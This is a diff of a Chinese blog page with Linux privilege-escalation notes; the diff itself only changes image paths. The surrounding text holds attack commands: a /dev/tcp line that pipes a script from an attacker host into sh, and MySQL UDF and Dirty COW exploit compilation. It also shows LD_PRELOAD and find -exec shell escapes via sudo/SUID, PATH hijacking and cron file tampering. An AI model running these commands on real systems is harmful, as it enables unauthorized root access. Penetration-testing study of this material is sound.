@@ -445,7 +445,7 @@
 </ol>
 <p><strong>要重点关注第shell类型来判断出可利用的用户</strong></p>
 <p>例如，假设 <code>/etc/passwd</code>文件中其中一行信息如下：</p>
-<p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20240918200841565.png" alt="image-20240918200841565"></p>
+<p><img src="/.com//image-20240918200841565.png" alt="image-20240918200841565"></p>
 <p>其含义解读如下：</p>
 <ul>
 <li>用户名：test-user</li>
@@ -498,8 +498,8 @@
 <p>不使用curl wget</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> &lt; /dev/tcp/10.10.10.10/80 |sh <span class="comment">#靶机</span></span><br><span class="line"><span class="built_in">sudo</span> nc -lvnp 80 &lt; linpeas.sh <span class="comment">#kali </span></span><br></pre></td></tr></table></figure>
 
-<h2 id="linux常用指令"><a href="#linux常用指令" class="headerlink" title="linux常用指令"></a>linux常用指令</h2><p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20240912083249406.png" alt="image-20240912083249406"></p>
-<p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20240912083146234.png" alt="image-20240912083146234"></p>
+<h2 id="linux常用指令"><a href="#linux常用指令" class="headerlink" title="linux常用指令"></a>linux常用指令</h2><p><img src="/.com//image-20240912083249406.png" alt="image-20240912083249406"></p>
+<p><img src="/.com//image-20240912083146234.png" alt="image-20240912083146234"></p>
 <h2 id="My-sql-UDF"><a href="#My-sql-UDF" class="headerlink" title="My sql UDF"></a>My sql UDF</h2><h3 id="UDF-user-defined-function"><a href="#UDF-user-defined-function" class="headerlink" title="UDF :user defined function"></a>UDF :user defined function</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">searchploit UDF</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> 1518.c</span><br><span class="line"></span><br><span class="line">gcc -g -c raptor_udf2.c</span><br><span class="line"></span><br><span class="line">gcc -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc</span><br><span class="line"></span><br><span class="line">mysql -u xxxx -p</span><br></pre></td></tr></table></figure>
 
 <p>前提条件<strong>secure_file_priv</strong>为空 ps:<strong>为null不行</strong></p>
@@ -536,7 +536,7 @@
 <li><code>-nostartfiles</code>: 不链接标准启动文件。这在编译共享库时可能会用到，尤其是当你不需要标准的 C 库初始化时。</li>
 </ul>
 <p>会编译出一个 shell.so文件，到此，提权的脚本准备完毕，现在<strong>需要使用一个高权限用户的任意一个命令来一个执行脚本</strong>，可以知道，sudo -l 有时还会显示如下图</p>
-<p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20241021112101545.png" alt="image-20241021112101545"></p>
+<p><img src="/.com//image-20241021112101545.png" alt="image-20241021112101545"></p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> LD_PRELOAD=/home/user/shell.so find</span><br><span class="line"><span class="comment">#通过使用root的find命令，在命令执行之前预先加载我们脚本中的库</span></span><br></pre></td></tr></table></figure>
 
 <h2 id="crontab文件权限提权"><a href="#crontab文件权限提权" class="headerlink" title="crontab文件权限提权"></a>crontab文件权限提权</h2><h3 id="修改文件内容"><a href="#修改文件内容" class="headerlink" title="修改文件内容"></a>修改文件内容</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cat</span> /etc/crontab</span><br><span class="line">locate xx.sh <span class="comment">#查看目标定时任务路径</span></span><br></pre></td></tr></table></figure>
@@ -568,7 +568,7 @@
 
 <p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/262592.html">https://www.freebuf.com/vuls/262592.html</a></p>
 <p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/liang-chen/p/14367408.html">https://www.cnblogs.com/liang-chen/p/14367408.html</a></p>
-<p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20240913161141322.png" alt="image-20240913161141322"></p>
+<p><img src="/.com//image-20240913161141322.png" alt="image-20240913161141322"></p>
 <p>找查什么文件不重要（但是是存在的文件),只需要格式对，然后后面加上</p>
 <h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>eg:</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name index.php -<span class="built_in">exec</span> <span class="string">&quot;/bin/sh&quot;</span> \;</span><br></pre></td></tr></table></figure>
@@ -594,7 +594,7 @@
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings /usr/localbin/suid-env </span><br></pre></td></tr></table></figure>
 
 <p>#看到</p>
-<p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20241021165510651.png" alt="image-20241021165510651"></p>
+<p><img src="/.com//image-20241021165510651.png" alt="image-20241021165510651"></p>
 <p>这里用service命令<strong>启动apache服务</strong>，<strong>service apache2 start</strong>。因为这里的service<strong>用的是相对路径</strong>，而相对路径就与环境变量中的<strong>PATH</strong>有关，当试图启动apache服务时，系统会去PATH里，<strong>按照路径的先后顺序依此寻找service脚本</strong>。这里就可以<strong>通过更改环境变量中的PATH实现提权</strong>。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim service.c</span><br></pre></td></tr></table></figure>
 
@@ -614,7 +614,7 @@
 <p><code>searchsploit -p 19256</code> 查看漏洞poc相关内容  or  github搜索提权</p>
 <h2 id="脏牛提权"><a href="#脏牛提权" class="headerlink" title="脏牛提权"></a>脏牛提权</h2><p>1.先在&#x2F;tmp目录上传<code>(rz)</code>脏牛文件， ps:&#x2F;tmp任意用户都有操作权限</p>
 <p>2.编译脏牛文件 <code>gcc -pthread dirty.c -o dirty -lcrypt</code></p>
-<p><img src="/2024/10/22/%E6%8F%90%E6%9D%83/image-20240912085517210.png" alt="image-20240912085517210"></p>
+<p><img src="/.com//image-20240912085517210.png" alt="image-20240912085517210"></p>
 <p>3.执行文件   <code>./dirty</code>   </p>
 <h2 id="sudo提权"><a href="#sudo提权" class="headerlink" title="sudo提权"></a>sudo提权</h2><p>2021年1月26日,Sudo发布安全通告,修复了一个类Unix操作系系统在命令参数中转义反斜杠时存在基于<br>堆的缓冲区溢出漏洞。当sudo通过-s或-i命令行选项在shell模式下运行命令时,它将在命令参数中使<br>用反斜杠转义特殊字符。但使用-s或-i标志运行sudoedit时,实际上并未进行转义,从而可能导致缓<br>冲区溢出。因此只要存在sudoers文件(通常是&#x2F;etc&#x2F;sudoers),攻击者就可以使用本地普通用户利用<br>sudo获得系统root权限。目前漏洞细节已公开,请受影响的用户尽快采取措施进行防护。<br>相关文章:Linux中su和sudo的用法和区别<br><a target="_blank" rel="noopener" href="https://xie1997.blog.csdn.net/article/details/99710793">https://xie1997.blog.csdn.net/article/details/99710793</a></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">漏洞影响版本</span><br><span class="line">Sudo 1.8.2 - 1.8.31p2</span><br><span class="line">Sudo 1.9.0 - 1.9.5p1</span><br><span class="line">不受影响版本:sudo=&gt;1.9.5p2</span><br></pre></td></tr></table></figure>
